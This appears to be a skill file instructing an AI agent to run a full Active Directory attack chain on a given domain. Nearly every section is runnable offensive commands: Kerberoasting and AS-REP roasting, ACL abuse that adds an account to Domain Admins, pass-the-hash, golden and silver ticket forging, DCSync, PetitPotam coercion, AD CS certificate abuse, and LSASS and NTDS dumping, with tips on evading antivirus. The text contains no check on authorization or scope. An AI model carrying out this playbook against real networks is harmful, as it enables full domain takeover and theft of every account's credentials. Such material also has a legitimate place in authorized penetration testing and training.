---
name: ad-attacks
description: Use when attacking Active Directory environments, hunting Kerberoastable accounts, AS-REP roasting, DCSync, Pass-the-Hash, Pass-the-Ticket, BloodHound path analysis, LDAP enumeration, GPO abuse, ACL abuse, or full AD domain compromise chains. Also use when the user says "attack AD", "domain compromise", "Kerberoast", "DCSync", "BloodHound", or "lateral movement".
---

# Active Directory Attack Chain

## Philosophy
AD attacks are graph problems. One misconfigured ACL + one weak password + one delegation flag = domain admin.
BloodHound reveals the shortest path. Your job is to walk it.
Never claim "domain compromised" without NTDS.dit hash dump or DA shell evidence.

## Arguments
`<target>` - domain (e.g. corp.local or DC IP)
`<focus>` - optional: ENUM / KERBEROAST / ASREP / DCSync / LATERAL / FULL

---

## Phase 1 - Unauthenticated LDAP Enumeration

```bash
# Anonymous LDAP bind (null session)
ldapsearch -x -H ldap://<DC-IP> -b "DC=corp,DC=local" "(objectClass=*)" 2>/dev/null | head -100

# Check if anonymous bind works (often disabled but worth trying)
ldapsearch -x -H ldap://<DC-IP> -b "" -s base "(objectClass=*)" namingContexts

# Enumerate with nmap LDAP scripts (no creds needed)
nmap -p 389,636,3268 --script ldap-rootdse,ldap-search <DC-IP>

# SMB null session enumeration
crackmapexec smb <DC-IP> --users --pass-pol
enum4linux-ng -A <DC-IP>

# Kerberos user enumeration (no creds, just username list)
kerbrute userenum --dc <DC-IP> --domain corp.local /opt/wordlists/usernames.txt
# Valid users: Kerberos returns KDC_ERR_PREAUTH_REQUIRED (vs KDC_ERR_C_PRINCIPAL_UNKNOWN)
```

---

## Phase 2 - AS-REP Roasting (Pre-Auth Disabled)

**Goal:** Extract crackable hash for any user with "Do not require Kerberos pre-authentication"

```bash
# Find AS-REP roastable accounts (no creds needed - just a username list)
impacket-GetNPUsers corp.local/ -usersfile /tmp/users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip <DC-IP>

# With valid domain user creds (finds all pre-auth disabled accounts):
impacket-GetNPUsers corp.local/validuser:password -request -format hashcat -dc-ip <DC-IP>

# Also via crackmapexec:
crackmapexec ldap <DC-IP> -u 'validuser' -p 'password' --asreproast asrep.txt

# Crack offline:
hashcat -m 18200 asrep_hashes.txt /opt/wordlists/rockyou.txt --force
# Mode 18200 = Kerberos 5 AS-REP etype 23 ($krb5asrep$)

# Confirm: test cracked credentials
crackmapexec smb <DC-IP> -u cracked_user -p cracked_password
```

---

## Phase 3 - Kerberoasting (Service Account Hashes)

**Goal:** Extract TGS hashes for accounts with SPNs - these are often service accounts with weak passwords

```bash
# List all Kerberoastable accounts (requires any domain user)
impacket-GetUserSPNs corp.local/validuser:password -dc-ip <DC-IP> -outputfile kerberoast.txt

# Request ALL service tickets in one shot:
impacket-GetUserSPNs corp.local/validuser:password -dc-ip <DC-IP> -request -outputfile spn_hashes.txt

# Via crackmapexec:
crackmapexec ldap <DC-IP> -u validuser -p password --kerberoasting krb_hashes.txt

# Prioritize high-value SPNs:
grep -i "MSSQLSvc\|HTTP\|CIFS\|ldap\|exchangeMDB" spn_hashes.txt

# Crack offline:
hashcat -m 13100 spn_hashes.txt /opt/wordlists/rockyou.txt --force
# Mode 13100 = Kerberos 5 TGS-REP etype 23 ($krb5tgs$)

# Evidence needed: actual cracked hash + successful auth with service account
```

---

## Phase 4 - BloodHound Enumeration (Attack Path Graph)

**Goal:** Map ALL attack paths from any owned account to Domain Admin

```bash
# Collect BloodHound data (from domain-joined machine or with creds):
bloodhound-python -u validuser -p password -d corp.local -dc <DC-IP> -c All --zip

# Alternative: SharpHound (from Windows):
# SharpHound.exe -c All --zipfilename bloodhound_data.zip

# Import into BloodHound:
# 1. Start neo4j: neo4j start
# 2. Start bloodhound: bloodhound &
# 3. Import zip: Upload Data button

# Critical BloodHound queries (run in Raw Query box):
# Shortest path to DA:
MATCH p=shortestPath((u:User {name:"OWNED_USER@CORP.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p

# All Kerberoastable paths to DA:
MATCH p=shortestPath((u:User {hasspn:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p

# GenericAll / GenericWrite ACL abuses (most common path):
MATCH (u:User)-[r:GenericAll|GenericWrite|WriteDACL|WriteOwner]->(t) RETURN u.name, type(r), t.name

# Unconstrained delegation targets:
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name, c.operatingsystem

# ACL abuse - owned user with GenericWrite on another:
# GenericWrite on User = targeted Kerberoasting or shadow credentials
# GenericAll on Group = add yourself
# WriteDACL = grant yourself any permission
# WriteOwner = take ownership -> WriteDACL
```

---

## Phase 5 - ACL Abuse Chain

**Goal:** Walk the BloodHound path via ACL misconfigurations

```bash
# GenericWrite on User -> Targeted Kerberoasting (add SPN, roast, crack)
# powerview (from Windows):
# Set-DomainObject -Identity targetuser -SET @{serviceprincipalname='fake/spn'} -Credential $creds
# impacket-GetUserSPNs corp.local/youraccount:pass -dc-ip <DC> -request -outputfile targeted.txt

# GenericAll on Group -> Add yourself
impacket-net corp.local/youraccount:pass -dc-ip <DC-IP> group members "Domain Admins"
# Add via LDAP:
ldapmodify -H ldap://<DC-IP> -D "CN=youraccount,DC=corp,DC=local" -w password << EOF
dn: CN=Domain Admins,CN=Users,DC=corp,DC=local
changetype: modify
add: member
member: CN=youraccount,CN=Users,DC=corp,DC=local
EOF

# WriteDACL -> Grant yourself DCSync rights
impacket-dacledit corp.local/youraccount:pass -dc-ip <DC-IP> -principal youraccount -target-dn "DC=corp,DC=local" -action write -rights DCSync

# Shadow Credentials (GenericWrite on User, requires AD CS or PKINIT):
# pywhisker.py -d corp.local -u youraccount -p pass --target targetuser --action add --dc-ip <DC-IP>
# Outputs: pfx file + password -> use with PKINIT to get TGT for target user
```

---

## Phase 6 - Pass-the-Hash / Pass-the-Ticket

**Goal:** Lateral movement without cracking hashes

```bash
# Pass-the-Hash (NTLM auth with hash):
impacket-psexec corp.local/administrator@<target-IP> -hashes :<NT-HASH>
impacket-wmiexec corp.local/administrator@<target-IP> -hashes :<NT-HASH>
impacket-smbexec corp.local/administrator@<target-IP> -hashes :<NT-HASH>
crackmapexec smb <subnet>/24 -u administrator -H <NT-HASH>  # spray across subnet

# Overpass-the-Hash -> TGT (from NTLM hash get Kerberos TGT):
impacket-getTGT corp.local/administrator -hashes :<NT-HASH> -dc-ip <DC-IP>
export KRB5CCNAME=/tmp/administrator.ccache
impacket-psexec corp.local/administrator@<DC-IP> -k -no-pass

# Pass-the-Ticket (from captured .ccache or kirbi):
export KRB5CCNAME=/path/to/ticket.ccache
impacket-smbclient corp.local/targetuser@<DC-IP> -k -no-pass

# Silver Ticket (forge service ticket with service account NTLM hash):
# Service: CIFS on fileserver.corp.local, service account hash: <NT>
impacket-ticketer -nthash <service-NT-HASH> -domain-sid <DOMAIN-SID> -domain corp.local -spn cifs/fileserver.corp.local admin
export KRB5CCNAME=admin.ccache
impacket-smbclient //fileserver.corp.local/C$ -k -no-pass

# Golden Ticket (forge TGT with krbtgt hash = unrestricted access):
impacket-ticketer -nthash <KRBTGT-HASH> -domain-sid <DOMAIN-SID> -domain corp.local -groups 512 admin
export KRB5CCNAME=admin.ccache
impacket-psexec corp.local/admin@<DC-IP> -k -no-pass
```

---

## Phase 7 - DCSync (Domain Credential Dump)

**Goal:** Pull ALL domain hashes as if you are a DC (replication rights needed)

```bash
# DCSync - requires: Domain Admin OR account with DCSync rights (Replicating Changes + Replicating Changes All)
impacket-secretsdump corp.local/administrator:password@<DC-IP>
impacket-secretsdump -just-dc corp.local/administrator:password@<DC-IP>

# Using NT hash (Pass-the-Hash):
impacket-secretsdump corp.local/administrator@<DC-IP> -hashes :<NT-HASH>

# Target specific accounts only (less noisy):
impacket-secretsdump corp.local/administrator:password@<DC-IP> -just-dc-user krbtgt
impacket-secretsdump corp.local/administrator:password@<DC-IP> -just-dc-user administrator

# From Windows (mimikatz):
# lsadump::dcsync /domain:corp.local /all /csv
# lsadump::dcsync /user:krbtgt

# Evidence needed: NTLM hash dump for krbtgt account = full domain compromise
# Hash format: username:RID:LM-HASH:NT-HASH:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<NTLM-HASH>:::
```

---

## Phase 8 - Unconstrained Delegation Abuse

**Goal:** Any computer with unconstrained delegation + coerce auth from DC = DA hashes

```bash
# Find unconstrained delegation machines (from BloodHound or LDAP):
ldapsearch -x -H ldap://<DC-IP> -D "user@corp.local" -w password \
  -b "DC=corp,DC=local" "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
  dNSHostName userAccountControl | grep dNS

# Step 1: Get shell on unconstrained delegation server (via PTH, exploit, etc.)
# Step 2: Wait for privileged user to connect OR coerce DC auth using:

# PrinterBug (MS-RPRN) - force DC to authenticate to you:
impacket-printerbug corp.local/validuser:pass@<DC-IP> <your-unconstrained-server>

# PetitPotam (MS-EFSRPC) - coerce authentication:
python3 PetitPotam.py -u validuser -p pass -d corp.local <your-server-IP> <DC-IP>

# Step 3: On unconstrained server - capture TGT with Rubeus / mimikatz:
# Rubeus.exe monitor /interval:5 /filteruser:DC$  (Windows)
# When DC authenticates -> capture DC$ TGT

# Step 4: DCSync with captured DC$ TGT:
export KRB5CCNAME=/tmp/dc_machine.ccache
impacket-secretsdump -just-dc corp.local/DC\$@<DC-IP> -k -no-pass
```

---

## Phase 9 - Constrained Delegation Abuse (S4U2Proxy)

```bash
# Find constrained delegation accounts:
ldapsearch -x -H ldap://<DC-IP> -D "user@corp.local" -w pass \
  -b "DC=corp,DC=local" "(msDS-AllowedToDelegateTo=*)" \
  sAMAccountName msDS-AllowedToDelegateTo

# If account has S4U2Self + S4U2Proxy rights:
# Step 1: Get TGT for the constrained delegation account
impacket-getTGT corp.local/svc_constrained:password -dc-ip <DC-IP>
export KRB5CCNAME=svc_constrained.ccache

# Step 2: Use S4U2Self to impersonate any user (including admin) to yourself:
impacket-getST corp.local/svc_constrained:password -spn cifs/targetserver.corp.local -impersonate administrator -dc-ip <DC-IP>
export KRB5CCNAME=administrator@cifs_targetserver.ccache

# Step 3: Use ticket:
impacket-smbclient //targetserver.corp.local/C$ -k -no-pass
impacket-psexec corp.local/administrator@targetserver.corp.local -k -no-pass
```

---

## Phase 10 - AD CS (Certificate Services) Attacks - ESC1 through ESC8

**Goal:** Certificate enrollment misconfigs = domain persistence or priv esc (PetitPotam + NTLM relay to AD CS)**

```bash
# Find AD CS vulnerabilities:
certipy find -username validuser@corp.local -password password -dc-ip <DC-IP> -vulnerable -stdout

# ESC1 - Enroll any cert with arbitrary SAN (Subject Alternative Name):
# Vulnerable template: Client Auth + enrollee supplies subject + low-priv can enroll
certipy req -username validuser@corp.local -password password -ca <CA-NAME> \
  -template <VULN-TEMPLATE> -upn administrator@corp.local -dc-ip <DC-IP>
# Gets: administrator.pfx -> authenticate as administrator

# ESC4 - Write access to certificate template (modify to become ESC1):
certipy template -username validuser@corp.local -password password \
  -template <VULN-TEMPLATE> -save-old -dc-ip <DC-IP>
# Enable msPKI-Certificate-Name-Flag = ENROLLEE_SUPPLIES_SUBJECT -> now ESC1

# ESC8 - NTLM relay to AD CS HTTP endpoint:
# Step 1: Start relay
impacket-ntlmrelayx -t http://<CA-IP>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# Step 2: Coerce DC auth (PetitPotam):
python3 PetitPotam.py -u validuser -p pass -d corp.local <relay-listener-IP> <DC-IP>
# Result: DC$ certificate in base64 -> use for auth

# Use certificate to get TGT:
certipy auth -pfx administrator.pfx -username administrator -domain corp.local -dc-ip <DC-IP>
# Outputs: administrator.ccache + NT hash
```

---

## Phase 11 - Credential Dumping & Persistence

```bash
# LSASS dump (requires local admin):
# Method 1: Procdump (signed MS binary, less AV detection):
# procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Method 2: Task Manager -> Create dump file on lsass.exe

# Method 3: Volume Shadow Copy (stealthy):
# wmic shadowcopy call create Volume='C:\'
# copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM .\SYSTEM
# copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .\SAM
# impacket-secretsdump LOCAL -sam SAM -system SYSTEM

# Parse LSASS dump offline (from Linux):
impacket-secretsdump -system SYSTEM.hiv -ntds ntds.dit LOCAL

# NTDS.dit extraction (offline DC database = ALL domain hashes):
# Requires DA or Backup Operators group
impacket-secretsdump -ntds ntds.dit -system SYSTEM.hiv -hashes lmhash:nthash LOCAL

# Persistence via DSRM (Directory Services Restore Mode):
# DSRM password = local admin fallback on every DC
# impacket-secretsdump -just-dc-user DSRM corp.local/administrator:pass@<DC-IP>
# Use DSRM hash to authenticate as local admin on DC even if DA account changes
```

---

## Evidence Classification

**DOMAIN COMPROMISE (Critical):**
- DCSync outputs krbtgt NTLM hash = complete domain compromise
- Golden Ticket forged and accepted = persistent access
- NTDS.dit dumped with all domain hashes

**HIGH:**
- DA account password cracked / NT hash obtained
- AS-REP / Kerberoast hash cracked for privileged service account
- Unconstrained delegation + DA TGT captured

**MEDIUM:**
- Kerberoastable hashes extracted but not cracked
- BloodHound path to DA identified but not walked
- ACL misconfig found but not exploited

---

## Output

Write to `~/pentest-toolkit/results/<target>/interesting_ad-attacks.md`:

```markdown
## Status
domain-compromised | partial-access | enum-only

## Summary
<domains found, DC IP, functional level, DA accounts compromised>

## Critical Findings
- [CONFIRMED] DCSync: krbtgt hash extracted — full domain compromise
  Evidence: <hash snippet>
  Command: impacket-secretsdump corp.local/admin:pass@<DC-IP>

## Attack Path Walked
1. AS-REP roast svc_backup -> crack hash -> GenericWrite on DA user -> Shadow Creds -> DA
2. Unconstrained delegation srv01 -> PetitPotam coerce DC -> capture DC$ TGT -> DCSync

## Hashes Obtained
| Account | Type | Hash | Cracked |
|---------|------|------|---------|
| administrator | NTLM | aad3...5ee | YES: Password123! |
| krbtgt | NTLM | <hash> | NO |

## BloodHound Paths
- <count> paths from owned users to Domain Admins
- Shortest: <N> hops via <technique>

## Next Steps
1. <what needs cracking or confirmation>
2. <chain opportunity>
```

Tell user: "AD attack phase complete. `interesting_ad-attacks.md` written. Key path: <one-liner>. Run `/triage <target>` to aggregate."
